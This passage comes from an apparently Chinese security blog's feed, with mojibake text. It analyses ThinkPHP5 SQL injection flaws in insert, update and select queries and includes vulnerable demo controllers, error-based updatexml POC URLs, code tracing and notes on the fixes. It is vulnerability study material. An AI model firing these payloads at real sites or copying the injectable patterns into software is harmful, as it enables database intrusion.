src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916185031.png" alt="image-20200916161144712"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;h2 id=&quot;ThinkPHP5æ–‡ä»¶åŒ…å«æ¼æ´&quot;&gt;&lt;a href=&quot;#ThinkPHP5æ–‡ä»¶åŒ…å«æ¼æ´&quot; class=&quot;headerlink&quot; title=&quot;ThinkPHP5æ–‡ä»¶åŒ…å«æ¼æ´&quot;&gt;&lt;/a&gt;ThinkPHP5æ–‡ä»¶åŒ…å«æ¼æ´&lt;/h2&gt;&lt;h2 id=&quot;</summary>
      
    
    
    
    
    <category term="ä»£ç å®¡è®¡" scheme="https://hack-for.fun/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="æ–‡ä»¶åŒ…å«" scheme="https://hack-for.fun/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP5æ¼æ´å­¦ä¹ -SQLæ³¨å…¥</title>
    <link href="https://hack-for.fun/69fea760.html"/>
    <id>https://hack-for.fun/69fea760.html</id>
    <published>2020-09-13T05:40:27.000Z</published>
    <updated>2021-03-25T13:26:54.210Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><p>å‚è€ƒèµ„æ–™ï¼š<a href="https://github.com/Mochazz/ThinkPHP-Vuln">https://github.com/Mochazz/ThinkPHP-Vuln</a></p><p>ç¯å¢ƒå‡†å¤‡ï¼š</p><ul><li>PHPStorm + MAMP PRO</li></ul><p>ç¯å¢ƒæ­å»ºå¯ä»¥çœ‹æˆ‘å‰ä¸¤ç¯‡æ–‡ç« ã€‚</p><ul><li>composer</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">brew install composer</span><br><span class="line">composer config -g repo.packagist composer https:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;composer&#x2F;</span><br></pre></td></tr></table></figure><ul><li>è·å–å¤ç°ä»£ç </li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project --prefer-dist topthink&#x2F;think&#x3D;5.0.15 tpdemo</span><br></pre></td></tr></table></figure><p>å°† <strong>composer.json</strong> æ–‡ä»¶çš„ <strong>require</strong> å­—æ®µè®¾ç½®æˆå¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot;require&quot;: &#123;</span><br><span class="line">    &quot;php&quot;: &quot;&gt;&#x3D;5.4.0&quot;,</span><br><span class="line">    &quot;topthink&#x2F;framework&quot;: &quot;5.0.15&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>SQL æ³¨å…¥demo ç¯å¢ƒ</li></ul><p>ä¿®æ”¹<code>/application/index/controller/index.php</code> çš„ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $username = request()-&gt;get(<span class="string">&#x27;username/a&#x27;</span>);</span><br><span class="line">        db(<span class="string">&#x27;users&#x27;</span>)-&gt;insert([<span class="string">&#x27;username&#x27;</span> =&gt; $username]);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Update success&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>æ¨¡æ‹Ÿè¿™é‡Œå­˜åœ¨ä¸€ä¸ªç”¨æˆ·ä¼ å‚å¹¶ä¸æ•°æ®åº“äº¤äº’çš„åœºæ™¯ã€‚</p></blockquote><p>å¯èƒ½ä¼šå­˜åœ¨ï¼ŒSQL æŠ¥é”™</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913191229.png" alt="image-20200913135221064"></p><p>ä¿®æ”¹username å­—æ®µé»˜è®¤ä¸º<code>NULL</code>  å³å¯è§£å†³é—®é¢˜ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913191250.png" alt="image-20200913134825568"></p><h1 id="SQLæ³¨å…¥ä¸€-insert"><a href="#SQLæ³¨å…¥ä¸€-insert" class="headerlink" title="SQLæ³¨å…¥ä¸€(insert)"></a>SQLæ³¨å…¥ä¸€(insert)</h1><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public&#x2F;index&#x2F;index?username[0]&#x3D;inc&amp;username[1]&#x3D;updatexml(1,concat(0x7,user(),0x7e),1)&amp;username[2]&#x3D;1 </span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913191832.png" alt="image-20200913134332556"></p><h2 id="å½±å“ç‰ˆæœ¬"><a href="#å½±å“ç‰ˆæœ¬" class="headerlink" title="å½±å“ç‰ˆæœ¬"></a>å½±å“ç‰ˆæœ¬</h2><p><strong>5.0.13&lt;=ThinkPHP&lt;=5.0.15</strong> ã€ <strong>5.1.0&lt;=ThinkPHP&lt;=5.1.5</strong></p><h2 id="æ¼æ´æ¦‚è¿°"><a href="#æ¼æ´æ¦‚è¿°" class="headerlink" title="æ¼æ´æ¦‚è¿°"></a>æ¼æ´æ¦‚è¿°</h2><p>æœ¬æ¬¡æ¼æ´å­˜åœ¨äº <strong>Builder</strong> ç±»çš„ <strong>parseData</strong> æ–¹æ³•ä¸­ã€‚ç”±äºç¨‹åºæ²¡æœ‰å¯¹æ•°æ®è¿›è¡Œå¾ˆå¥½çš„è¿‡æ»¤ï¼Œå°†æ•°æ®æ‹¼æ¥è¿› <strong>SQL</strong> è¯­å¥ï¼Œå¯¼è‡´ <strong>SQLæ³¨å…¥æ¼æ´</strong> çš„äº§ç”Ÿã€‚</p><p>ç±»å‹ï¼š<code>insert</code> æ³¨å…¥ã€‚</p><h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><blockquote><p>å¯¹äºå¼€æºé¡¹ç›®ï¼Œåœ¨issue æˆ–è€… commit \ Releases è®°å½•ä¸­ï¼Œå°±èƒ½æ‰¾åˆ°å†å²æ¼æ´ä¿¡æ¯ã€‚è¿™ä¸€ç‚¹åœ¨CTFä¸­ç»å¸¸ç”¨åˆ°ï¼Œå°¤å…¶æ˜¯Node.js çš„ç¬¬ä¸‰æ–¹ä¾èµ–æ¼æ´ã€‚</p></blockquote><p>ä»æ¼æ´å½±å“ç‰ˆæœ¬å¯ä»¥å»æ‰¾ å·²ç»ä¿®å¤åçš„ç‰ˆæœ¬ï¼Œ<a href="https://github.com/top-think/framework/releases/tag/v5.0.16">https://github.com/top-think/framework/releases/tag/v5.0.16</a></p><p>é€šè¿‡github çš„<code>compare</code>åŠŸèƒ½ï¼Œå³å¯æŸ¥çœ‹ä»£ç å‘ç”Ÿäº†å“ªäº›ä¿®æ”¹ã€‚</p><p><a href="https://github.com/top-think/framework/compare/v5.0.16...master">https://github.com/top-think/framework/compare/v5.0.16...master</a></p><p>åœ¨<code>/thinkphp/library/think/db/Connection.php</code> çš„ 314ï¼Œ 316 è¡Œä¸‹æ–­ç‚¹Debugï¼Œæ‰“payloadã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913191848.png" alt="image-20200913141903209"></p><p>INSERT INTO <code>users</code> (<code>username</code>) VALUES (updatexml(1,concat(0x7,user(),0x7e),1)+1) </p><p>åŒæ—¶æˆåŠŸæ”»å‡»çš„Payload æ‰€åœ¨çš„å‚æ•°ä½äº <code>username[1]</code> çš„ <code>value</code>  ã€‚</p><p>æ”»å‡»Payload ç»è¿‡ThinkPHP çš„å†…ç½®è¿‡æ»¤åï¼Œè¿›å…¥<code>$this-&gt;builder</code> çš„<code>Query</code> ç±»çš„<code>insert</code> æ–¹æ³•ï¼Œæ‰§è¡Œå…¶ä¸­çš„SQLè¯­å¥ï¼Œå¹¶åœ¨åé¢è¿”å›å‡ºäº†æ‰§è¡Œç»“æœã€‚å› ä¸ºPayloadåˆ©ç”¨<code>updatexml()</code>æ¥æŠ¥é”™ï¼Œå› æ­¤å¿…é¡»å¼€å¯<code>app_debug</code> æ¥å¼€å¯SQL æŠ¥é”™ä¿¡æ¯ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913192007.png" alt="image-20200913155142684"></p><p>(å¦‚ä¸Šå›¾debug ç»“æœä¸­Query.phpï¼‰ï¼Œ<code>$this-&gt;builder</code> ä¸º <code>think\db\builder\Mysql</code> ç±»ï¼Œ<code>Query</code> çš„å®šä¹‰ä½äº <code>thinkphp/library/think/db/builder/Mysql.php</code> </p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913192026.png" alt="image-20200913161424839"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913192043.png" alt="image-20200913161552092"></p><p>åœ¨<code>/thinkphp/library/think/db/builder/Mysql.php</code> , <code>Mysql</code> ç±»ç»§æ‰¿äº<code>Builder</code> ç±»ï¼Œå³ä¸Šé¢çš„ <strong>$this-&gt;builder-&gt;insert()</strong> æœ€ç»ˆè°ƒç”¨çš„æ˜¯ <strong>Builder</strong> ç±»çš„ <strong>insert</strong> æ–¹æ³•</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913192059.png" alt="image-20200913162209236"></p><p>æ–¹æ³•è°ƒç”¨<code>parseData()</code>æ–¹æ³•æ¥åˆ†æå¹¶å¤„ç†æ•°æ®ï¼Œè·Ÿè¿›è¯¥æ–¹æ³•ã€‚</p><p><code>/thinkphp/library/think/db/Builder.php</code> </p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913193005.png" alt="image-20200913163148214"></p><p>åœ¨<code>inc</code> å’Œ <code>dec</code> çš„ æƒ…å†µä¸‹ï¼Œå°†å¯æ§æ•°æ®<code>$val[1]</code>é€šè¿‡<code>parseKey</code>æ–¹æ³•å¤„ç†åï¼Œè¿›è¡Œæ‹¼æ¥ï¼Œå¹¶è¿”å›<code>$result</code></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913192945.png" alt="image-20200913185951795"></p><p><code>parseKey</code>æ–¹æ³• ä¸åšä»»ä½•å¤„ç†ï¼Œæ˜¯ç›´æ¥è¿”å›å€¼çš„ä¸€ä¸ªæ–¹æ³•ã€‚</p><blockquote><p>å› æ­¤ï¼Œå¸¦æœ‰æ¶æ„SQL è¯­å¥çš„Payloadï¼Œè¢«æ‹¼æ¥ä¸”æ²¡ä»»ä½•å­—ç¬¦ä¸²å½¢å¼å¤„ç†åœ¨Builderç±»çš„insertæ–¹æ³•ä¸­ï¼Œé€šè¿‡str_replaceå‡½æ•°ç›´æ¥æ›¿æ¢ï¼Œè¿”å›sqlï¼Œå¸¦å…¥SQLè¯­å¥ä¸­è¢«æ‰§è¡Œï¼Œé€ æˆäº†SQLæ³¨å…¥æ¼æ´ã€‚</p></blockquote><p>åœ¨<code>thinkphp/library/think/Request.php</code> ä¸­ï¼Œæœ‰è°ƒç”¨å†…ç½®è¿‡æ»¤ï¼ˆç›´æ¥æ›¿æ¢ä¸ºç©ºï¼‰æ–¹æ³•ï¼Œå¯¹å‚æ•°<code>exp</code>è¿›è¡Œè¿‡æ»¤ï¼Œåœ¨case <code>exp</code>çš„æƒ…å†µä¸‹ï¼Œæ— æ³•é€ æˆæ¼æ´ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913192928.png" alt="carbon"></p><p>é—®é¢˜ï¼šä¸ºä»€ä¹ˆä¸èƒ½å°†æ¶æ„Payload ç”¨<code>username[2]</code> æ¥æŠ•é€’ï¼Ÿ</p><p>åŸå› ï¼š</p><p>åŒæ ·çš„åŠæ³•ï¼Œä¸‹æ–­ç‚¹ï¼Œdebug å¯ä»¥çœ‹åˆ°ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913192915.png" alt="image-20200913181025221"></p><p>å›åˆ°ä¹‹å‰çš„<code>parseDate</code> æ–¹æ³•ï¼Œ<code>username[2]</code>çš„å€¼é€šè¿‡<code>floatval</code>å‡½æ•°å¤„ç†</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913192902.png" alt="image-20200913171023035"></p><p>payload å˜ä¸ºäº†<code>0</code> ï¼Œä¸” ä¼šå­˜åœ¨SQL é”™è¯¯ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913192852.png" alt="image-20200913182241348"></p><h2 id="åˆ©ç”¨æ€»ç»“"><a href="#åˆ©ç”¨æ€»ç»“" class="headerlink" title="åˆ©ç”¨æ€»ç»“"></a>åˆ©ç”¨æ€»ç»“</h2><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913192749.png" alt="image-20200913185834897"></p><h2 id="æ¼æ´ä¿®å¤"><a href="#æ¼æ´ä¿®å¤" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h2><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913192803.png" alt="image-20200913151252661"></p><h1 id="SQLæ³¨å…¥äºŒ-update"><a href="#SQLæ³¨å…¥äºŒ-update" class="headerlink" title="SQLæ³¨å…¥äºŒ(update)"></a>SQLæ³¨å…¥äºŒ(update)</h1><p>å¤ç°ä»£ç è·å–ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project --prefer-dist topthink&#x2F;think&#x3D;5.1  tpdemo3</span><br></pre></td></tr></table></figure><p>å°† <strong>composer.json</strong> æ–‡ä»¶çš„ <strong>require</strong> å­—æ®µè®¾ç½®æˆå¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot;require&quot;: &#123;</span><br><span class="line">    &quot;php&quot;: &quot;&gt;&#x3D;5.6.0&quot;,</span><br><span class="line">    &quot;topthink&#x2F;framework&quot;: &quot;5.1.7&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨<code>../config/app.php</code> ä¸­ï¼Œéœ€è¦ä¿®æ”¹<code>app_trace</code> ä¸ºtrueï¼Œ <code>app_debug</code> é»˜è®¤å¼€å¯äº†ã€‚</p><p>åˆ›å»ºæ•°æ®åº“ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">create database tpdemo;</span><br><span class="line">use tpdemo;</span><br><span class="line">create table users(</span><br><span class="line">id int primary key auto_increment,</span><br><span class="line">username varchar(50) not null</span><br><span class="line">);</span><br><span class="line">insert into users(id,username) values(1,&#39;testuser&#39;);</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä¹Ÿè¦è®¾ç½®username å­—æ®µ ä¸º<code>NULL</code> æ‰è¡Œ</p><p>ä¿®æ”¹<code>/application/index/controller/index.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $username = request()-&gt;get(<span class="string">&#x27;username/a&#x27;</span>);</span><br><span class="line">        db(<span class="string">&#x27;users&#x27;</span>)-&gt;where([<span class="string">&#x27;id&#x27;</span> =&gt; <span class="number">1</span>])-&gt;update([<span class="string">&#x27;username&#x27;</span> =&gt; $username]);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Update success&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;public&#x2F;index&#x2F;index?username[0]&#x3D;point&amp;username[1]&#x3D;1&amp;username[2]&#x3D;updatexml(1,concat(0x7,user(),0x7e),1)^&amp;username[3]&#x3D;0</span><br></pre></td></tr></table></figure><p>å¾ˆSQL æ³¨å…¥ä¸€éå¸¸ç±»ä¼¼ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200914203133.png" alt="image-20200914152750668"></p><h2 id="å½±å“ç‰ˆæœ¬-1"><a href="#å½±å“ç‰ˆæœ¬-1" class="headerlink" title="å½±å“ç‰ˆæœ¬"></a>å½±å“ç‰ˆæœ¬</h2><p>æ¼æ´å½±å“ç‰ˆæœ¬ï¼š <strong>5.1.6&lt;=ThinkPHP&lt;=5.1.7</strong> (éæœ€æ–°çš„ <strong>5.1.8</strong> ç‰ˆæœ¬ä¹Ÿå¯åˆ©ç”¨)ã€‚</p><h2 id="æ¼æ´æ¦‚è¿°-1"><a href="#æ¼æ´æ¦‚è¿°-1" class="headerlink" title="æ¼æ´æ¦‚è¿°"></a>æ¼æ´æ¦‚è¿°</h2><p>æœ¬æ¬¡æ¼æ´å­˜åœ¨äº <strong>Mysql</strong> ç±»çš„ <strong>parseArrayData</strong> æ–¹æ³•ä¸­ç”±äºç¨‹åºæ²¡æœ‰å¯¹æ•°æ®è¿›è¡Œå¾ˆå¥½çš„è¿‡æ»¤ï¼Œå°†æ•°æ®æ‹¼æ¥è¿› <strong>SQL</strong> è¯­å¥ï¼Œå¯¼è‡´ <strong>SQLæ³¨å…¥æ¼æ´</strong> çš„äº§ç”Ÿ</p><p>æ³¨å…¥ç±»å‹ï¼š<code>update</code> æ³¨å…¥</p><h2 id="æ¼æ´åˆ†æ-1"><a href="#æ¼æ´åˆ†æ-1" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><blockquote><p>å¯¹äºå¼€æºé¡¹ç›®ï¼Œåœ¨issue æˆ–è€… commit \ Releases è®°å½•ä¸­ï¼Œå°±èƒ½æ‰¾åˆ°å†å²æ¼æ´ä¿¡æ¯ã€‚è¿™ä¸€ç‚¹åœ¨CTFä¸­ç»å¸¸ç”¨åˆ°ï¼Œå°¤å…¶æ˜¯Node.js çš„ç¬¬ä¸‰æ–¹ä¾èµ–æ¼æ´ã€‚</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200914203118.png" alt="image-20200914161022479"></p><ul><li>ä¸‹æ–­ç‚¹ï¼Œdebugã€‚è§‚å¯Ÿå‚æ•°ä¼ é€’è¿‡ç¨‹</li><li>ç›‘æ§MySQL</li></ul><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200914203111.png" alt="image-20200914184917592"></p><hr><p>ä¸‹æ–­ç‚¹ï¼Œå¼€å¯Debugï¼Œæ‰“Payloadã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200914202218.png" alt="image-20200914173011583"></p><p><code>../thinkphp/library/think/db/Query.php</code> ä¸­ï¼ŒPayload ä¼ å…¥Query ç±»çš„ <code>update</code>æ–¹æ³•ï¼Œè·Ÿè¿›è¯¥æ–¹æ³•ï¼Œè¯¥æ–¹æ³•è°ƒç”¨äº†<code>Connection</code> ç±»çš„è¯¥æ–¹æ³•ä¸º<code>update</code>æ–¹æ³•ï¼Œè¯¥æ–¹æ³•åˆè°ƒç”¨äº† </p><p><code>$this-&gt;builder</code> çš„<code>update</code> æ–¹æ³•ï¼Œæ­¤å¤„çš„<code>$this-&gt;builder</code> ä¸ºä¸º<code>think\db\builder\Mysql</code> ç±»ã€‚<code>class Mysql extends Builder</code> ï¼Œè¯¥ç±»ç»§æ‰¿äº<code>Builder</code> ç±»ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200914202201.png" alt="image-20200914170732409"></p><p>åœ¨<code>Builder</code>ç±»ä¸­çš„<code>update</code>æ–¹æ³•ï¼Œè°ƒç”¨äº†<code>parseData</code>æ–¹æ³•ï¼Œï¼ˆæ­£å¦‚ä¸Šå›¾debugç»“æœã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200914202036.png" alt="image-20200914184754350"></p><p>åœ¨è¯¥æ–¹æ³•ä¸­çš„<code>swich</code>è¯­å¥ä¸­ï¼Œä¹‹å‰å‡ºç°è¿‡æ¼æ´ï¼Œç°åœ¨å¤šäº†ä¸€æ¡default è¯­å¥ã€‚è€Œåœ¨æ–°ç‰ˆæœ¬ä¸­è¢«åˆ é™¤äº†ã€‚</p><p>è·Ÿè¿›åˆ°<code>parseData</code> æ–¹æ³•ï¼Œå‘ç°Payload åˆè¢«<code>parseArrayData</code>æ–¹æ³•å¤„ç†ï¼Œç»§ç»­è·Ÿè¿›ï¼Œ</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200914202026.png" alt="image-20200914185836504"></p><p>åœ¨<code>../thinkphp/library/think/db/builder/Mysql.php</code> ä¸­çš„ 200 è¡Œè¿”å›result çš„åœ°æ–¹æ‰“æ–­ç‚¹ï¼Œè°ƒè¯•ç»“æœå¦‚ä¸‹ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200914202011.png"></p><p>æ­¤å¤„å°†å¯æ§å˜é‡ç»è¿‡æ‹¼æ¥åè¢«å¸¦å…¥æ•°æ®åº“è¿›è¡ŒæŸ¥è¯¢ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200914201959.png" alt="image-20200914193548748"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">parseArrayData</span>(<span class="params">Query $query, $data</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">list</span>($type, $value) = $data;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (strtolower($type)) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;point&#x27;</span>:</span><br><span class="line">            $fun   = <span class="keyword">isset</span>($data[<span class="number">2</span>]) ? $data[<span class="number">2</span>] : <span class="string">&#x27;GeomFromText&#x27;</span>;</span><br><span class="line">            $point = <span class="keyword">isset</span>($data[<span class="number">3</span>]) ? $data[<span class="number">3</span>] : <span class="string">&#x27;POINT&#x27;</span>;</span><br><span class="line">            <span class="keyword">if</span> (is_array($value)) &#123;</span><br><span class="line">                $value = implode(<span class="string">&#x27; &#x27;</span>, $value);</span><br><span class="line">            &#125;</span><br><span class="line">            $result = $fun . <span class="string">&#x27;(\&#x27;&#x27;</span> . $point . <span class="string">&#x27;(&#x27;</span> . $value . <span class="string">&#x27;)\&#x27;)&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            $result = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$result = $fun . <span class="string">&#x27;(\&#x27;&#x27;</span> . $point . <span class="string">&#x27;(&#x27;</span> . $value . <span class="string">&#x27;)\&#x27;)&#x27;</span>;</span><br></pre></td></tr></table></figure><p>ä¸‰ä¸ªå˜é‡å‡å¯æ§ã€‚å½¢å¼ä¸ºï¼š<code>$a(&#39;$b($c)&#39;)</code> </p><blockquote><p>ç°åœ¨å°±æ˜¯æƒ³åŠæ³•å¦‚ä½•é—­åˆï¼Œç„¶åè¿›è¡Œæ³¨å…¥æ”»å‡»ã€‚</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE &#96;users&#96;  SET &#96;username&#96; &#x3D; $a(&#39;$b($c)&#39;)  WHERE  &#96;id&#96; &#x3D; 1;</span><br></pre></td></tr></table></figure><p>å³è®©<code>$fun</code> ä¸ºæˆ‘ä»¬çš„æ¶æ„Payload å³å¯ã€‚ç„¶åé—­åˆæ‰åé¢çš„éƒ¨åˆ†ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">updatexml(1,concat(0x7,user(),0x7e),1)^(&#39;0(1)&#39;)</span><br></pre></td></tr></table></figure><h2 id="åˆ©ç”¨æ€»ç»“-1"><a href="#åˆ©ç”¨æ€»ç»“-1" class="headerlink" title="åˆ©ç”¨æ€»ç»“"></a>åˆ©ç”¨æ€»ç»“</h2><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200914201929.png" alt="carbon"></p><p>ä¸‹å›¾æ¥è‡ªå‚è€ƒèµ„æ–™ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200914201900.png" alt="8"></p><h2 id="æ¼æ´ä¿®å¤-1"><a href="#æ¼æ´ä¿®å¤-1" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h2><p>å‡çº§æœ€æ–°ç‰ˆï¼Œ</p><p>å®˜æ–¹ç›´æ¥åˆ äº†<code>parseArrayDate</code> å‡½æ•°ã€‚</p><blockquote><p>ä¸€ç‚¹ç‚¹æ„Ÿæƒ³ï¼Œæˆ‘æ„Ÿè§‰æŒ‰ç…§è¿™ä¸ªå¸ˆå‚…çš„åˆ†ææ€è·¯ï¼Œæ˜¯é€†ç€payload å»åˆ†æçš„æ¼æ´åŸå› ï¼Œæˆ‘å¥½æƒ³æ­£é¢ç›´æ¥æŒ–å•Šï¼Œèœæ­»äº†ã€‚</p></blockquote><h1 id="SQLæ³¨å…¥ä¸‰-select"><a href="#SQLæ³¨å…¥ä¸‰-select" class="headerlink" title="SQLæ³¨å…¥ä¸‰(select)"></a>SQLæ³¨å…¥ä¸‰(select)</h1><p>æ–°å¢å‚è€ƒèµ„æ–™ï¼š<a href="https://www.cnblogs.com/wangtanzhi/p/12732557.html">https://www.cnblogs.com/wangtanzhi/p/12732557.html</a></p><blockquote><p>å­¦ä¹ å°±æ˜¯è¦å­¦ä¹ ä¸åŒå¤§ä½¬çš„æ€è·¯ï¼Œç„¶åè½¬æ¢ä¸ºè‡ªå·±çš„æ€è·¯ã€‚</p></blockquote><h2 id="POC-2"><a href="#POC-2" class="headerlink" title="POC"></a>POC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;public&#x2F;index.php&#x2F;index&#x2F;index&#x2F;?username&#x3D;)%20union%20select%20updatexml(1,concat(0x7,user(),0x7e),1)%23</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915105138.png" alt="image-20200914214213065"></p><p>sqlmap ä¹Ÿå¯ä»¥è·‘å‡ºç»“æœã€‚</p><h2 id="å½±å“ç‰ˆæœ¬-2"><a 